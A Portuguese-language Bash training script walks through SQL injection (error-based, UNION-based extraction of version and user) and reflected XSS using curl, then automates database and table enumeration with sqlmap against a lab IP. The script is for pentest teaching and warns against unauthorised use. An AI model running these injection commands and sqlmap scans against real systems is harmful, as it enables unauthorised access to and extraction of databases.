#!/bin/bash
# ==========================================================
# POLYDEV | Kali Engineering
# KAL03 - Exploração de Aplicações Web (SQLi e XSS)
# ==========================================================
#
# TECNOLOGIA:
# Kali Linux
#
# LINGUAGEM:
# Bash
#
# OBJETIVO:
# Este documento demonstra técnicas manuais e automatizadas
# para exploração das vulnerabilidades mais comuns: Injeção
# de SQL (SQLi) e Cross-Site Scripting (XSS). O foco é
# compreender a mecânica do ataque para aplicar defesas
# eficazes no desenvolvimento de software.
#
# ATENÇÃO:
# Nunca tente explorar estas falhas em sistemas de terceiros
# sem um contrato de Pentest assinado. Use apenas em
# laboratórios como DVWA, HackTheBox ou aplicações próprias.
#
# Leia • Entenda • Execute seu código
# ==========================================================

# ==========================================================
# ETAPA 01. Detecção Manual de SQL Injection (Error-Based)
# ==========================================================
# Injeta uma aspa simples para forçar um erro de sintaxe no banco de dados
# Se o aplicativo retornar um erro SQL na tela, a vulnerabilidade é confirmada
curl "http://192.168.1.105/page.php?id=1'"

# ==========================================================
# ETAPA 02. Exploração Manual de SQLi (UNION Based)
# ==========================================================
# Usa o comando UNION para mesclar uma consulta maliciosa à consulta original
# O objetivo é descobrir o número exato de colunas para extrair dados
curl "http://192.168.1.105/page.php?id=1 UNION SELECT 1,2,3--"

# ==========================================================
# ETAPA 03. Extração de Dados via SQLi Manual
# ==========================================================
# Substitui as colunas numéricas por funções do banco (ex: versão e usuário)
curl "http://192.168.1.105/page.php?id=-1 UNION SELECT version(),user(),3--"

# ==========================================================
# ETAPA 04. Detecção de Cross-Site Scripting (Reflected XSS)
# ==========================================================
# Injeta um script JavaScript básico em um parâmetro de busca
# Se o script for executado no navegador, a vulnerabilidade existe
curl "http://192.168.1.105/search.php?q=<script>alert('POLYDEV_XSS')</script>"

# ==========================================================
# ETAPA 05. Automatização de SQL Injection com SQLMap
# ==========================================================
# A ferramenta padrão da indústria para automação de SQLi
# -u: Define a URL alvo
# --batch: Não pede confirmação do usuário, roda direto
sqlmap -u "http://192.168.1.105/page.php?id=1" --batch

# ==========================================================
# ETAPA 06. Enumeração do Banco de Dados com SQLMap
# ==========================================================
# --dbs: Solicita ao SQLMap que liste todos os bancos de dados existentes
sqlmap -u "http://192.168.1.105/page.php?id=1" --dbs --batch

# ==========================================================
# ETAPA 07. Extração de Tabelas de um Banco Específico
# ==========================================================
# -D: Especifica o banco de dados alvo
# --tables: Lista todas as tabelas dentro desse banco
sqlmap -u "http://192.168.1.105/page.php?id=1" -D alvo_web --tables --batch